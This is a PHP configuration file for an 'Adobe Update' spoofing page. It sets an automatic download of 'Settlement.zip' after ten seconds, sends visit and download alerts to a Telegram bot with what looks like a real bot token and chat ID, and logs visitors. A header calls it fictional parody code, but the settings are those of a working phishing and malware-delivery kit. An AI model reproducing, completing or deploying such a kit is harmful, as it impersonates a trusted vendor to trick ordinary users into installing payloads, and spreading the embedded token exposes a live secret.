<?php
// Configuration file for the Adobe spoofing page
// FICTIONAL CODE FOR MOVIE/PARODY PROJECT

return [
    // Telegram configuration
    'telegram' => "1", // 1 = enabled, 0 = disabled
    'bot_url' => "6009909172:AAF3ord_6VC52-_rWT7TLN4g4TwdWkIrgyg", // Replace with your actual bot token
    'chat_id' => "5558454239", // Replace with your chat ID

    // Site configuration
    'site_name' => "Adobe Update",
    'download_filename' => 'Settlement.zip', // Change to your filename,
    
    // Download settings
    'auto_download_delay' => 10, // Seconds before auto download
    
    // Notification settings
    'notify_on_visit' => true,
    'notify_on_download' => true,
    
    // Advanced options - for future use
    'custom_redirect' => "", // If set, redirects user after download
    'log_visits' => true,
    'log_downloads' => true,
    'ip_blacklist' => [
        // Add IPs to block here
        // '127.0.0.1',
    ],
];
?>